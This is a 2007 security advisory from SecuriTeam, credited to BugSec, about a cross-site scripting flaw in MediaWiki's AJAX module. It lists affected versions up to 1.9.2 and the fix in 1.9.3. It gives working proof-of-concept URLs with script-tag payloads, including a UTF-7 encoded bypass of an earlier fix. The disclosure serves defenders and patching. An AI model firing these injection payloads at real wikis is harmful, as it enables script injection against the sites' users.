http://www.securiteam.com/unixfocus/5DP0O0AKKQ.html

MediaWiki Cross-site Scripting (UTF-7, AJAX) 	21 Feb. 2007
 
 Summary
MediaWiki v1.8.2 and below are vulnerable to plain Cross-site scripting attack by exploiting the experimental AJAX features, if enabled (default). This XSS was fixed in post 1.8.2 versions (1.8.3, 1.9.0rc2, 1.9.0, 1.9.1, 1.9.2). This fix can be bypassed by encoding the XSS exploit to UTF-7. NOTE: browsers encoding auto-detection has to be enabled for successful exploitation.
 
Credit:
The information has been provided by Moshe BA from BugSec.
The original article can be found at: http://www.bugsec.com/articles.php?Security=24

Vulnerable Systems:
 * MediaWiki version 1.9.2 and below

Immune Systems:
 * MediaWiki version 1.9.3

Proof-of-concept:
The following URL will cause arbitrary HTML and/or JavaScript in the response returned from the server: http://[Host]/wiki/index.php?action=ajax&rs=[XSS] (UTF-7 XSS in post 1.8.2 versions)

Examples:
For v1.8.2 and below:
http://[Host]/wiki/index.php?action=ajax &rs=%3Cscript%3Ewindow.open('http://www.bugsec.com')%3C/script%3E (v1.8.3 - v1.9.2)

http://[Host]/wiki/index.php?action=ajax &rs=+ADw-SCRIPT+AD4-window.open('http://www.bugsec.com');+ADw-/SCRIPT+AD4-

http://[Host]/wiki/index.php?action=ajax &rs=%2B%41%44%77%2D%53%43%52%49%50%54
%2B%41%44%34%2D%61%6C%65%72%74%28%27%58%53%53%27%29%3B%2B%41%44%77
%2D%2F%53%43%52%49%50%54%2B%41%44%34%2D (URL Encoded)

Vendor response:
"An XSS injection vulnerability based on Microsoft Internet Explorer's UTF-7 charset autodetection was located in the AJAX support module, affecting MSIE users on MediaWiki 1.6.x and up when the optional setting $wgUseAjax is enabled" - http://svn.wikimedia.org/svnroot/mediawiki/tags/REL1_9_3/phase3/RELEASE-NOTES. 
